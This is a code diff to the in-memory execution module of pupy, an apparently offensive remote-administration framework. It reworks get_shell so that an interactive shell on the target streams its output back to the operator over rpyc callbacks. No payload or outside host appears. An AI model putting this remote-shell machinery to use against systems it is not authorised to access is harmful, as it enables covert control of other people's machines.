@@ -1,6 +1,5 @@
 # -*- coding: utf-8 -*-
 
-import sys
 import time
 import os
 import ctypes
@@ -8,6 +7,7 @@ import traceback
 import time
 import threading
 import zlib
+import rpyc
 
 from select import select
 from pupy import mexec
@@ -30,6 +30,7 @@ class MExec(object):
         self._closed = False
 
     def close(self):
+        print 'Closing...'
         if self._closed:
             return
 
@@ -42,20 +43,44 @@ class MExec(object):
             self.pid = None
 
         if self.stdin:
-            self.stdin.close()
+            try:
+                self.stdin.close()
+            except IOError:
+                pass
 
         if self.stdout:
-            self._saved_stdout = self.stdout.read()
-            self.stdout.close()
+            try:
+                self._saved_stdout = self.stdout.read()
+            except IOError:
+                pass
+
+            try:
+                self.stdout.close()
+            except IOError:
+                pass
 
         if self.stderr:
-            self._saved_stdout = self._saved_stdout + self.stderr.read()
-            self.stderr.close()
+            try:
+                self._saved_stdout = self._saved_stdout + self.stderr.read()
+            except IOError:
+                pass
+
+            try:
+                self.stderr.close()
+            except IOError:
+                pass
 
         self._closed = True
 
     def __del__(self):
         self.close()
+
+    def write(self, data):
+        try:
+            self.stdin.write(data)
+            self.stdin.flush()
+        except:
+            self.EOF.set()
 
     def get_stdout(self):
         if self.no_stdor:
@@ -79,7 +104,7 @@ class MExec(object):
 
         return self._saved_stdout
 
-    def stdor_loop(self):
+    def stdor_loop(self, on_read, on_exit):
         if self.no_stdor:
             raise ValueError('You need to specify no_stdor=False to run stdor_loop')
 
@@ -101,44 +126,33 @@ class MExec(object):
                     data = f.read()
                     if data:
                         if f == self.stderr:
-                            self.stderr.write(data)
-                            self.stderr.flush()
+                            on_read(data, error=True)
                         else:
-                            self.stdout.write(data)
-                            self.stdout.flush()
+                            on_read(data)
                     else:
                         fds.remove(f)
-
-            self.EOF.set()
+        except:
+            pass
 
         finally:
+            on_exit()
+            self.EOF.set()
             self.close()
 
-    def get_shell(self):
+    def get_shell(self, on_read, on_exit):
         if self.no_stdin:
             raise ValueError('You need to specify no_stdin=False to use shell')
 
         if self.no_stdor:
             raise ValueError('You need to specify no_stdor=False to use shell')
 
-        try:
-            reader = threading.Thread(target=self.stdor_loop)
-            reader.daemon = True
-            reader.start()
+        reader = threading.Thread(
+            target=self.stdor_loop, args=(
+                rpyc.async(on_read), rpyc.async(on_exit)))
+        reader.daemon = True
+        reader.start()
 
-            while not self.EOF.is_set():
-                line = raw_input()
-                if line == 'exit':
-                    self.EOF.set()
-                else:
-                    self.stdin.write(line)
-                    self.stdin.flush()
-
-        except KeyboardInterrupt:
-            self.EOF.set()
-
-        finally:
-            self.close()
+        return self.stdin
 
     def run(self):
         pid, stdior = mexec(
